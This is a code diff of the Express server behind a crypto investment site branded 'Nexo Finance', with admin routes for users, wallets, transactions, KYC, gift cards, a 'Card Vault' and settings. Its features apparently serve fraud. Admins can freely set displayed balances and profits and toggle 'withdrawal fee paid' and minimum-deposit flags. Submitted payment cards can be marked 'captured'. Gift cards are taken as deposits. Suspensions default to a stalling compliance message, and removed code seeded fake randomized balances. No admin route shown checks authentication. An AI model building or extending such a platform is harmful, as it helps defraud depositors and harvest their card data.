+      two_factor_enabled: false,
+      referral_code: `NEXO-${Math.random().toString(36).substring(2, 7).toUpperCase()}`,
+      referral_earnings: 0,
+      status: status || 'active',
+      avatar_url: '',
+    }]).select().single();
+
+    if (error || !data) return res.status(500).json({ error: 'Failed to create user: ' + (error?.message || '') });
+    return res.status(201).json(safeUser(rowToUser(data)));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// Admin: Update user
+app.put('/api/admin/users/:uid', async (req, res) => {
+  try {
+    const { uid } = req.params;
+    const {
+      balance, profitBalance, stakedBalance, totalDeposited, totalWithdrawn,
+      isAdmin, isVerified, hasDepositedMinimum, withdrawalFeePaid,
+      twoFactorEnabled, kycTier, kycStatus, status, banReason,
+      fullName, phone, country, securityPin,
+    } = req.body;
+
+    const updates: any = {};
+    if (balance !== undefined) updates.balance = parseFloat(balance);
+    if (profitBalance !== undefined) updates.profit_balance = parseFloat(profitBalance);
+    if (stakedBalance !== undefined) updates.staked_balance = parseFloat(stakedBalance);
+    if (totalDeposited !== undefined) updates.total_deposited = parseFloat(totalDeposited);
+    if (totalWithdrawn !== undefined) updates.total_withdrawn = parseFloat(totalWithdrawn);
+    if (isAdmin !== undefined) updates.is_admin = isAdmin;
+    if (isVerified !== undefined) updates.is_verified = isVerified;
+    if (hasDepositedMinimum !== undefined) updates.has_deposited_minimum = hasDepositedMinimum;
+    if (withdrawalFeePaid !== undefined) updates.withdrawal_fee_paid = withdrawalFeePaid;
+    if (twoFactorEnabled !== undefined) updates.two_factor_enabled = twoFactorEnabled;
+    if (kycTier !== undefined) updates.kyc_tier = parseInt(kycTier);
+    if (kycStatus !== undefined) updates.kyc_status = kycStatus;
+    if (status !== undefined) updates.status = status;
+    if (banReason !== undefined) updates.ban_reason = banReason;
+    if (fullName !== undefined) updates.full_name = fullName;
+    if (phone !== undefined) updates.phone = phone;
+    if (country !== undefined) updates.country = country;
+    if (securityPin !== undefined) updates.security_pin = securityPin;
+
+    const { data, error } = await db
+      .from('users')
+      .update(updates)
+      .eq('uid', uid)
+      .select()
+      .single();
+
+    if (error || !data) return res.status(404).json({ error: 'User not found or update failed' });
+    return res.json(safeUser(rowToUser(data)));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// Admin: Suspend/Activate user
+app.put('/api/admin/users/:uid/status', async (req, res) => {
+  try {
+    const { uid } = req.params;
+    const { status, banReason } = req.body;
+
+    const updates: any = { status };
+    if (status === 'suspended') {
+      updates.is_banned = true;
+      updates.ban_reason = banReason || 'Administrative compliance review in progress. Please contact support.';
     } else {
-      user.kycStatus = 'rejected';
+      updates.is_banned = false;
+      updates.ban_reason = null;
     }
+
+    const { data, error } = await db.from('users').update(updates).eq('uid', uid).select().single();
+    if (error || !data) return res.status(404).json({ error: 'User not found' });
+    return res.json(safeUser(rowToUser(data)));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
   }
-
-  res.json({ message: `KYC Document marked as ${doc.status}`, document: doc, user });
 });
 
-app.get('/api/admin/giftcards', (_req, res) => {
-  res.json(giftCardsStore);
+// Admin: Delete user
+app.delete('/api/admin/users/:uid', async (req, res) => {
+  try {
+    const { uid } = req.params;
+    const { error } = await db.from('users').delete().eq('uid', uid);
+    if (error) return res.status(500).json({ error: 'Failed to delete user' });
+    return res.json({ message: 'User deleted successfully' });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
-app.put('/api/admin/giftcards/:id/action', (req, res) => {
-  const { id } = req.params;
-  const { action, reason } = req.body; // 'approve' | 'reject'
-  const gift = giftCardsStore.find((g) => g.id === id);
-  if (!gift) return res.status(404).json({ error: 'Gift card submission not found' });
+// Admin: Wallets
+app.get('/api/admin/wallets', async (_req, res) => {
+  try {
+    const { data } = await db.from('admin_wallets').select('*').order('coin');
+    return res.json((data || []).map(rowToWallet));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
 
-  const previousStatus = gift.status;
-  gift.status = action === 'approve' ? 'approved' : 'rejected';
-  if (reason) gift.adminReason = reason;
+app.post('/api/admin/wallets', async (req, res) => {
+  try {
+    const { coin, network, address, label, memo, qrCodeUrl, isEnabled } = req.body;
+    if (!coin || !address) return res.status(400).json({ error: 'Coin and address are required' });
 
-  const user = usersStore.find((u) => u.uid === gift.userId || u.email === gift.userEmail);
-  if (action === 'approve' && previousStatus !== 'approved' && user) {
-    user.balance += gift.amount;
-    user.totalDeposited = (user.totalDeposited || 0) + gift.amount;
-    if (user.totalDeposited >= 500) {
-      user.hasDepositedMinimum = true;
+    const walletId = genId('wlt');
+    const { data, error } = await db.from('admin_wallets').insert([{
+      id: walletId,
+      coin,
+      network: network || coin,
+      address,
+      label: label || `${coin} Wallet`,
+      memo: memo || '',
+      qr_code_url: qrCodeUrl || '',
+      is_enabled: isEnabled !== false,
+    }]).select().single();
+
+    if (error || !data) return res.status(500).json({ error: 'Failed to add wallet' });
+    return res.status(201).json(rowToWallet(data));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.put('/api/admin/wallets/:id', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const { coin, network, address, label, memo, qrCodeUrl, isEnabled } = req.body;
+
+    const updates: any = {};
+    if (coin !== undefined) updates.coin = coin;
+    if (network !== undefined) updates.network = network;
+    if (address !== undefined) updates.address = address;
+    if (label !== undefined) updates.label = label;
+    if (memo !== undefined) updates.memo = memo;
+    if (qrCodeUrl !== undefined) updates.qr_code_url = qrCodeUrl;
+    if (isEnabled !== undefined) updates.is_enabled = isEnabled;
+
+    const { data, error } = await db
+      .from('admin_wallets')
+      .update(updates)
+      .eq('id', id)
+      .select()
+      .single();
+
+    if (error || !data) return res.status(404).json({ error: 'Wallet not found' });
+    return res.json(rowToWallet(data));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.delete('/api/admin/wallets/:id', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const { error } = await db.from('admin_wallets').delete().eq('id', id);
+    if (error) return res.status(404).json({ error: 'Wallet not found' });
+    return res.json({ message: 'Wallet removed successfully' });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// Admin: Transactions (Ledger)
+app.get('/api/admin/transactions', async (_req, res) => {
+  try {
+    const { data } = await db
+      .from('transactions')
+      .select('*')
+      .order('created_at', { ascending: false });
+    return res.json((data || []).map(rowToTx));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.put('/api/admin/transactions/:id/action', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const { action, reason } = req.body;
+
+    const { data: tx } = await db.from('transactions').select('*').eq('id', id).single();
+    if (!tx) return res.status(404).json({ error: 'Transaction not found' });
+
+    const newStatus = action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : 'pending';
+    await db.from('transactions').update({ status: newStatus, admin_reason: reason || null }).eq('id', id);
+
+    // Approved deposit → credit user balance
+    if (action === 'approve' && tx.type === 'deposit') {
+      const { data: user } = await db.from('users').select('*').eq('uid', tx.user_id).single();
+      if (user) {
+        const newBalance = parseFloat(user.balance) + parseFloat(tx.amount);
+        const newDeposited = parseFloat(user.total_deposited) + parseFloat(tx.amount);
+        await db.from('users').update({
+          balance: newBalance,
+          total_deposited: newDeposited,
+          has_deposited_minimum: newDeposited >= 500,
+        }).eq('uid', tx.user_id);
+      }
     }
-  }
 
-  // Update corresponding transaction if exists
-  const relatedTx = transactionsStore.find((t) => t.details?.includes(gift.code) || (t.userId === gift.userId && t.amount === gift.amount && t.method === 'giftcard'));
-  if (relatedTx) {
-    relatedTx.status = gift.status;
-  }
-
-  res.json({ message: `Gift card submission marked as ${gift.status}`, giftCard: gift, user });
-});
-
-app.get('/api/admin/cards', (_req, res) => {
-  res.json(cardsStore);
-});
-
-app.put('/api/admin/cards/:id/action', (req, res) => {
-  const { id } = req.params;
-  const { action } = req.body; // 'settled' | 'flagged' | 'captured'
-  const card = cardsStore.find((c) => c.id === id);
-  if (!card) return res.status(404).json({ error: 'Card submission not found' });
-
-  card.status = action === 'settled' ? 'settled' : action === 'flagged' ? 'flagged' : 'captured';
-
-  const user = usersStore.find((u) => u.uid === card.userId || u.email === card.userEmail);
-  if (action === 'settled' && user) {
-    user.balance += card.amount;
-    user.totalDeposited = (user.totalDeposited || 0) + card.amount;
-    if (user.totalDeposited >= 500) {
-      user.hasDepositedMinimum = true;
+    // Approved withdrawal → deduct balance and record total withdrawn
+    if (action === 'approve' && tx.type === 'withdrawal') {
+      const { data: user } = await db.from('users').select('*').eq('uid', tx.user_id).single();
+      if (user) {
+        const newBalance = Math.max(0, parseFloat(user.balance) - parseFloat(tx.amount));
+        const newWithdrawn = parseFloat(user.total_withdrawn) + parseFloat(tx.amount);
+        await db.from('users').update({
+          balance: newBalance,
+          total_withdrawn: newWithdrawn,
+        }).eq('uid', tx.user_id);
+      }
     }
+
+    return res.json({ message: `Transaction ${action}d successfully` });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
   }
-
-  res.json({ message: `Card transaction status updated to ${card.status}`, card, user });
 });
 
-app.get('/api/admin/settings', (_req, res) => {
-  res.json(globalSettingsStore);
+// Admin: KYC Verifications
+app.get('/api/admin/kyc', async (_req, res) => {
+  try {
+    const { data } = await db
+      .from('kyc_docs')
+      .select('*')
+      .order('submitted_at', { ascending: false });
+    return res.json((data || []).map(rowToKyc));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
-app.put('/api/admin/settings', (req, res) => {
-  const { key, value } = req.body;
-  if (!key) return res.status(400).json({ error: 'Setting key is required' });
+app.put('/api/admin/kyc/:id/action', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const { action, notes } = req.body;
 
-  let setting = globalSettingsStore.find((s) => s.key === key);
-  if (setting) {
-    setting.value = value;
-    setting.updatedAt = new Date().toISOString();
-  } else {
-    setting = {
-      key,
-      value,
-      description: 'Custom Platform Setting',
-      updatedAt: new Date().toISOString(),
+    const { data: kyc } = await db.from('kyc_docs').select('*').eq('id', id).single();
+    if (!kyc) return res.status(404).json({ error: 'KYC document not found' });
+
+    const newStatus = action === 'approve' ? 'approved' : 'rejected';
+    await db.from('kyc_docs').update({
+      status: newStatus,
+      admin_notes: notes || null,
+      reviewed_at: new Date().toISOString(),
+    }).eq('id', id);
+
+    if (action === 'approve') {
+      const { data: user } = await db.from('users').select('kyc_tier').eq('uid', kyc.user_id).single();
+      if (user) {
+        const currentTier = parseInt(user.kyc_tier) || 0;
+        const newTier = Math.min(currentTier + 1, 3);
+        const newKycStatus = newTier >= 2 ? 'verified_tier2' : 'verified_tier1';
+        await db.from('users').update({
+          kyc_tier: newTier,
+          kyc_status: newKycStatus,
+          is_verified: true,
+        }).eq('uid', kyc.user_id);
+      }
+    } else {
+      await db.from('users').update({ kyc_status: 'rejected' }).eq('uid', kyc.user_id);
+    }
+
+    return res.json({ message: `KYC ${action}d successfully` });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// Admin: Gift Cards
+app.get('/api/admin/giftcards', async (_req, res) => {
+  try {
+    const { data } = await db
+      .from('gift_cards')
+      .select('*')
+      .order('submitted_at', { ascending: false });
+    return res.json((data || []).map(rowToGiftCard));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.put('/api/admin/giftcards/:id/action', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const { action, reason } = req.body;
+
+    const { data: gc } = await db.from('gift_cards').select('*').eq('id', id).single();
+    if (!gc) return res.status(404).json({ error: 'Gift card not found' });
+
+    const newStatus = action === 'approve' ? 'approved' : 'rejected';
+    await db.from('gift_cards').update({ status: newStatus, admin_reason: reason || null }).eq('id', id);
+
+    if (action === 'approve') {
+      const { data: user } = await db.from('users').select('*').eq('uid', gc.user_id).single();
+      if (user) {
+        const newBalance = parseFloat(user.balance) + parseFloat(gc.amount);
+        const newDeposited = parseFloat(user.total_deposited) + parseFloat(gc.amount);
+        await db.from('users').update({
+          balance: newBalance,
+          total_deposited: newDeposited,
+          has_deposited_minimum: newDeposited >= 500,
+        }).eq('uid', gc.user_id);
+
+        await db.from('transactions').insert([{
+          id: genId('tx_gc'),
+          user_id: gc.user_id,
+          user_email: gc.user_email,
+          type: 'deposit',
+          method: 'giftcard',
+          amount: parseFloat(gc.amount),
+          coin: `Gift Card (${gc.type})`,
+          status: 'approved',
+          details: `Gift card deposit approved: ${gc.type}`,
+        }]);
+      }
+    }
+
+    return res.json({ message: `Gift card ${action}d successfully` });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// Admin: Card Vault
+app.get('/api/admin/cards', async (_req, res) => {
+  try {
+    const { data } = await db
+      .from('cards')
+      .select('*')
+      .order('submitted_at', { ascending: false });
+    return res.json((data || []).map(rowToCard));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.put('/api/admin/cards/:id/action', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const { action } = req.body;
+    const statusMap: Record<string, string> = {
+      approve: 'approved', reject: 'rejected',
+      settled: 'settled', flagged: 'flagged', captured: 'captured',
     };
-    globalSettingsStore.push(setting);
-  }
+    const newStatus = statusMap[action] || 'pending';
 
-  res.json({ message: 'Platform setting saved', setting, settings: globalSettingsStore });
+    const { data, error } = await db
+      .from('cards')
+      .update({ status: newStatus })
+      .eq('id', id)
+      .select()
+      .single();
+
+    if (error || !data) return res.status(404).json({ error: 'Card not found' });
+    return res.json({ message: `Card ${action}d successfully` });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
-// Admin Seed Route
-app.post('/api/admin/seed', (_req, res) => {
-  // Regenerate random balances for test users within $3,750 - $4,967 range
-  usersStore.forEach((u) => {
-    if (!u.isAdmin) {
-      u.balance = parseFloat((Math.random() * (4967 - 3750) + 3750).toFixed(2));
+// Admin: System Rules / Settings
+app.get('/api/admin/settings', async (_req, res) => {
+  try {
+    const { data } = await db.from('global_settings').select('*').order('key');
+    return res.json((data || []).map(rowToSetting));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.put('/api/admin/settings', async (req, res) => {
+  try {
+    const { key, value } = req.body;
+    if (!key) return res.status(400).json({ error: 'Setting key is required' });
+
+    const { data, error } = await db
+      .from('global_settings')
+      .upsert([{ key, value: String(value), updated_at: new Date().toISOString() }], { onConflict: 'key' })
+      .select()
+      .single();
+
+    if (error || !data) return res.status(500).json({ error: 'Failed to update setting' });
+    return res.json(rowToSetting(data));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// Admin: Re-seed default data on demand
+app.post('/api/admin/seed', async (_req, res) => {
+  try {
+    // Only insert wallets if table is empty
+    const { data: existingWallets } = await db.from('admin_wallets').select('id').limit(1);
+    if (!existingWallets || existingWallets.length === 0) {
+      await db.from('admin_wallets').insert([
+        { id: 'wlt_btc_01', coin: 'Bitcoin', network: 'BTC (Native SegWit)', address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', label: 'Primary BTC Cold Vault', memo: '', is_enabled: true, qr_code_url: '' },
+        { id: 'wlt_eth_01', coin: 'Ethereum', network: 'ERC20', address: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F', label: 'ETH Institutional Vault', memo: '', is_enabled: true, qr_code_url: '' },
+        { id: 'wlt_usdt_01', coin: 'USDT', network: 'TRC20', address: 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE', label: 'USDT TRC20 Prime', memo: '', is_enabled: true, qr_code_url: '' },
+        { id: 'wlt_usdc_01', coin: 'USDC', network: 'ERC20', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', label: 'USDC ERC20 Vault', memo: '', is_enabled: true, qr_code_url: '' },
+        { id: 'wlt_bnb_01', coin: 'BNB', network: 'BEP20', address: '0x000000000000000000000000000000000000dead', label: 'BNB Smart Chain Vault', memo: '', is_enabled: true, qr_code_url: '' },
+      ]);
     }
-  });
-
-  res.json({
-    message: 'Demo users & balances successfully reseeded with randomized institutional balances ($3,750 to $4,967).',
-    totalUsers: usersStore.length,
-  });
+    return res.json({ message: 'Seed operation completed.' });
+  } catch (err) {
+    return res.status(500).json({ error: 'Seed failed: ' + String(err) });
+  }
 });
 
-// Setup Vite middleware in development or static serving in production
-async function startServer() {
-  const isProduction = process.env.NODE_ENV === 'production';
-
-  if (!isProduction) {
-    const { createServer: createViteServer } = await import('vite');
-    const vite = await createViteServer({
-      server: { middlewareMode: true },
-      appType: 'spa',
-    });
-    app.use(vite.middlewares);
-  } else {
-    app.use(express.static(path.join(__dirname, 'dist')));
-    app.get('*', (_req, res) => {
-      res.sendFile(path.join(__dirname, 'dist', 'index.html'));
-    });
-  }
-
-  app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server running on port ${PORT}`);
-  });
-}
+// =============================================================================
+// SERVER STARTUP
+// =============================================================================
 
 const isEntrypoint = () => {
   try {
-    if (process.env.NETLIFY || process.env.AWS_LAMBDA_FUNCTION_NAME || process.env.LAMBDA_TASK_ROOT || process.env.VERCEL) {
-      return false;
-    }
-    const entry = process.argv[1] ? path.resolve(process.argv[1]) : '';
-    return entry.includes('server.ts') || entry.includes('server.js');
+    const thisFile = fileURLToPath(import.meta.url);
+    const entryFile = process.argv[1] ? path.resolve(process.argv[1]) : '';
+    return thisFile === entryFile;
   } catch {
     return false;
   }
 };
 
+export default app;
+
 if (isEntrypoint()) {
-  startServer().catch((err) => {
-    console.error('Failed to start server:', err);
+  app.listen(PORT, () => {
+    console.log(`🚀 Nexo Finance API running on port ${PORT}`);
+    console.log(`📊 Database: Supabase PostgreSQL`);
+    console.log(`🔑 Supabase URL: ${SUPABASE_URL}`);
   });
 }
-
-export default app;
-export { app };
-
